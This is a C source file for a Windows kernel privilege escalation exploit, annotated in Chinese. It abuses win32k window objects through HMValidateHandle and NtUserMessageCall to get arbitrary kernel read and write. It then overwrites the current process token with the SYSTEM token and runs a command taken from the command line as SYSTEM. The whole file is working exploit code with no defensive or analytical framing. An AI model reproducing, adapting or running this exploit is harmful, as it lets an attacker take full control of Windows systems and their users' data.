#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#define EXTRABYTES_SIZE_OFFSET_IN_TAGWND 0xE8
#define STRNAME_OFFSET_IN_TAGWND 0xD8
#define EXTRABYTES_OFFSET_IN_TAGWND 0x128
#define SPWNDLASTACTIVE_OFFSET_IN_TAGWND 0xF0
#define EPROCESS_OFFSET_IN_KTHREAD 0x210
#define TOKEN_OFFSET_IN_EPROCESS 0x208
#define EPROCESS_ENTRY_OFFSET_IN_EPROCESS 0x188
#define PID_OFFSET_IN_EPROCESS 0x180
#define OBJECT_HEADER_SIZE 0x30

typedef struct _LARGE_UNICODE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, * PLARGE_UNICODE_STRING;

typedef struct _THRDESKHEAD {
	HANDLE  h;
	ULONG   cLockObj;
	PVOID   pti;
	PVOID   rpdesk;
	PBYTE   pSelf;
} THRDESKHEAD, * PTHRDESKHEAD;

typedef PVOID(__fastcall* HMValidateHandle_t)(HANDLE, UINT);
extern "C" NTSTATUS  NtUserMessageCall(HANDLE hWnd, UINT msg, WPARAM wParam, LPARAM lParam, ULONG_PTR ResultInfo, DWORD dwType, BOOL bAscii);
extern "C" NTSTATUS  NtUserDefSetText(HANDLE hWnd, PLARGE_UNICODE_STRING plstr);
extern "C" ULONG g_NtUserDefSetText_syscall = 0x107f, g_NtUserMessageCall_syscall = 0x1007;

HMValidateHandle_t HMValidateHandle = 0;

HWND g_hWndList[0x100] = { 0 };
ULONG64 g_spKwnd[0x100] = { 0 };

BOOLEAN Init() {
	int offset = 0;
	ULONG next_code = 0;
	ULONG dwRetBytes = 0;
	int Kernel_Base_index = 0;
	HMODULE hKernel = 0;

	for (int i = 0; i < 0x100; i++) {
		PUCHAR tr = (PUCHAR)IsMenu + i;
		if (*tr == 0xE8)
		{//找到调用HMValidateHandle的指令位置
			offset = *(int*)((PCHAR)IsMenu + i + 1);
			next_code = (ULONG)IsMenu + i + 5;
			HMValidateHandle = (HMValidateHandle_t)(next_code + offset);
			break;
		}
	}

	if (!HMValidateHandle) {
		printf("[!]Error: %d\n", __LINE__ - 1);
		return FALSE;
	}
	printf("[+]Found HMValidateHandle = 0x%p\n", HMValidateHandle);

	return TRUE;
}

ULONG64 readQWORD(PVOID TargetAddr, HWND hWndAttack, HWND hWndVictim, ULONG64 Offset,PULONG64 OldQword) {
	WCHAR qwVal[8] = { 0 };
	ULONG64 ret;
	ret = SetWindowLongPtrW(hWndAttack, Offset, (ULONG64)TargetAddr);
	if (OldQword)*OldQword = ret;
	InternalGetWindowText(hWndVictim, qwVal, sizeof(qwVal));
	return *(PULONG64)qwVal;
}

VOID writeQWORD(
	PVOID TargetAddr, HWND hWndAttack, HWND hWndVictim, ULONG64 Offset, ULONG64 Value,  PULONG64 OldQword
) {
	ULONG64 ret;
	LARGE_UNICODE_STRING data = { 0 };
	ret = SetWindowLongPtrW(hWndAttack, Offset, (ULONG64)TargetAddr);
	if (OldQword)*OldQword = ret;
	data.bAnsi = 0;
	data.Length = 8;
	data.MaximumLength = 0xA;
	data.Buffer = (PWCHAR)&Value;
	NtUserDefSetText(hWndVictim, &data);
}

VOID Exploit(char* cmd) {
	WNDCLASSEXW wcs = { 0 };
	wcs.cbSize = sizeof(WNDCLASSEXW);
	wcs.cbWndExtra = 8;
	wcs.hInstance = GetModuleHandleA(0);
	wcs.lpszMenuName = 0;
	wcs.lpfnWndProc = DefWindowProcW;

	for (int i = 0; i < 0x100;) {
		WCHAR wszClsName[0x20];
		wsprintfW(wszClsName, L"%d", (i + 1) * 1998);
		wcs.lpszClassName = wszClsName;
		if (RegisterClassExW(&wcs)==INVALID_ATOM) {
			continue;
		}
		HWND hTmp = CreateWindowExW(
			NULL,
			wszClsName,
			L"Fuck you",
			WS_VISIBLE,
			0, 0, 0, 0, NULL, 0, GetModuleHandleA(0), 0
		);
		if (hTmp==INVALID_HANDLE_VALUE) {
			continue;
		}
		PTHRDESKHEAD spRdes = (PTHRDESKHEAD)HMValidateHandle(hTmp, 1);
		g_spKwnd[i] = (ULONG64)spRdes->pSelf;
		g_hWndList[i++] = hTmp;
	}

	HWND hWndAttack = 0;
	HWND hWndVictim = 0;
	ULONG64 spKwndAttack = 0;
	ULONG64 spKwndVictim = 0;
	BOOLEAN bOver = FALSE;

	//寻找在内核中位置相距在0xFF0000之内的两个窗口，其余窗口全部销毁
	for (int i = 0; i < 0x100 - 1 && !bOver; i++) {
		for (int j = i + 1; j < 0x100; j++) {
			hWndAttack = g_spKwnd[i] > g_spKwnd[j] ? g_hWndList[j] : g_hWndList[i];
			hWndVictim = (g_spKwnd[i] < g_spKwnd[j]) ? g_hWndList[j] : g_hWndList[i];

			spKwndAttack = (g_spKwnd[i] < g_spKwnd[j]) ? g_spKwnd[i] : g_spKwnd[j];
			spKwndVictim = (g_spKwnd[i] > g_spKwnd[j]) ? g_spKwnd[i] : g_spKwnd[j];

			if (spKwndVictim - spKwndAttack < 0xFF0000)
			{
				g_hWndList[i] = g_hWndList[j] = 0;
				bOver = TRUE;
				break;
			}
		}
	}

	for (int i = 0; i < 0x100; i++)
		DestroyWindow(g_hWndList[i]);

	if (spKwndAttack == 0 || spKwndVictim == 0) {
		printf("[+]Error:%d\n", __LINE__ - 1);
		return;
	}

	printf("[+]spKwndAttack = 0x%p\n", spKwndAttack);
	printf("[+]spKwndVictim = 0x%p\n", spKwndVictim);

	SetWindowLongPtrW(hWndAttack, 0, spKwndAttack+EXTRABYTES_SIZE_OFFSET_IN_TAGWND-0x60);
	//第一次调用NtUserMessageCall目的是给hTrigger对应的tagWND->fnid赋值0x2A0
	NtUserMessageCall(hWndAttack, WM_CREATE, 0, 0, 0, 0, 0);

	//创建一个类名为#32771的窗口，此窗口的特点是设置[gpsi+0x154]=0x130
	HWND hSwitchWnd= CreateWindowExW(0,L"#32771" , L"Switch Window", 0, 0, 0, 0, 0, NULL, NULL, GetModuleHandleA(0), NULL);
	if (hSwitchWnd == INVALID_HANDLE_VALUE) {
		printf("[!]Error: %d\n", __LINE__ - 2);
		return;
	}

	BYTE keyState[256];
	GetKeyboardState(keyState);
	keyState[VK_MENU] |= 0x80;
	SetKeyboardState(keyState);
	//第二次调用NtUserMessageCall目的是触发漏洞，此时hWndAttack的cbWndExtra已被修改成很大的数
	NtUserMessageCall(hWndAttack, 0x14, 0, 0, 0, 0, 0);

	ULONG64 ulOffset = spKwndVictim - spKwndAttack - EXTRABYTES_OFFSET_IN_TAGWND
		+ STRNAME_OFFSET_IN_TAGWND+8;

	printf("[+]ulOffset = 0x%p\n", ulOffset);
	PTHRDESKHEAD spRdes = (PTHRDESKHEAD)HMValidateHandle(hWndVictim, 1);

	ULONG64 ulOld;

	ULONG64 Ethread = readQWORD(spRdes->pti, hWndAttack, hWndVictim, ulOffset, &ulOld);

	printf("[+]ulOld = 0x%p\n", ulOld);
	printf("[+]Ethread = 0x%p\n", Ethread);
	
	ULONG64 CurEprocess = readQWORD((PVOID)(Ethread + EPROCESS_OFFSET_IN_KTHREAD),
		hWndAttack, hWndVictim, ulOffset, NULL);
	ULONG64 NextEprocess = CurEprocess;
	printf("[+]CurEprocess = 0x%p\n", CurEprocess);

	ULONG64 CurPid = GetCurrentProcessId();
	ULONG64 Pid = 0;
	ULONG64 Token = 0;
	ULONG64 OldToken = 0;
	PVOID TokenAddress = NULL;
	ULONG64 RefCnt;

	do {
		Pid = readQWORD((PVOID)(NextEprocess + PID_OFFSET_IN_EPROCESS),
			hWndAttack, hWndVictim, ulOffset, NULL);
		if (Pid == 4) {
			Token = readQWORD((PVOID)(NextEprocess + TOKEN_OFFSET_IN_EPROCESS),
				hWndAttack, hWndVictim, ulOffset, NULL);
		}
		else if (Pid == CurPid) {
			TokenAddress = (PVOID)(NextEprocess + TOKEN_OFFSET_IN_EPROCESS);
			OldToken = readQWORD((PVOID)(NextEprocess + TOKEN_OFFSET_IN_EPROCESS),
				hWndAttack, hWndVictim, ulOffset, NULL);
		}
		NextEprocess = readQWORD((PVOID)(NextEprocess + EPROCESS_ENTRY_OFFSET_IN_EPROCESS),
			hWndAttack, hWndVictim, ulOffset, NULL)- EPROCESS_ENTRY_OFFSET_IN_EPROCESS;
	} while (NextEprocess != CurEprocess);

	printf("[+]TokenAddress = 0x%p\n", TokenAddress);
	printf("[+]Token = 0x%p\n", Token);

	if (Token && TokenAddress) {
		/*	RefCnt = readQWORD((PVOID)((Token & 0xFFFFFFFFFFFFFFF0) - OBJECT_HEADER_SIZE ),
				hWndAttack, hWndVictim, ulOffset, NULL);
			printf("[+]System token RefCnt = %d\n", RefCnt);*/

		////修改令牌前，需要先修改令牌的引用计数
	/*	writeQWORD((PVOID)((Token & 0xFFFFFFFFFFFFFFF0) - OBJECT_HEADER_SIZE),
			hWndAttack, hWndVictim, ulOffset, RefCnt + 2, NULL);*/
	writeQWORD((PVOID)TokenAddress,
		hWndAttack, hWndVictim, ulOffset, (Token & 0xFFFFFFFFFFFFFFF0), NULL);

		printf("[*]Try execute %s as SYSTEM!\n", cmd);
		system(cmd);

	}
	else {
		printf("[-]Privilege escalation Failed!\n");
	}
	////防蓝屏操作
	//writeQWORD((PVOID)TokenAddress,
	//	hWndAttack, hWndVictim, ulOffset, OldToken,NULL);

	writeQWORD((PVOID)(spKwndAttack + STRNAME_OFFSET_IN_TAGWND), 
		hWndAttack, hWndVictim, ulOffset, 0,NULL);
	writeQWORD((PVOID)(spKwndAttack + STRNAME_OFFSET_IN_TAGWND+8),
		hWndAttack, hWndVictim, ulOffset, 0, NULL);
	writeQWORD((PVOID)(spKwndAttack + SPWNDLASTACTIVE_OFFSET_IN_TAGWND), 
		hWndAttack, hWndVictim, ulOffset, 0, NULL);
	SetWindowLongPtrW(hWndAttack, ulOffset, ulOld);

	return;
}

int main(int argc, char** argv) {
	if (Init()) {
		Exploit(argv[1]);
	}else{
		printf("[!]Error: %d\n", __LINE__ - 3);
	}
	system("pause");
	return 0;
}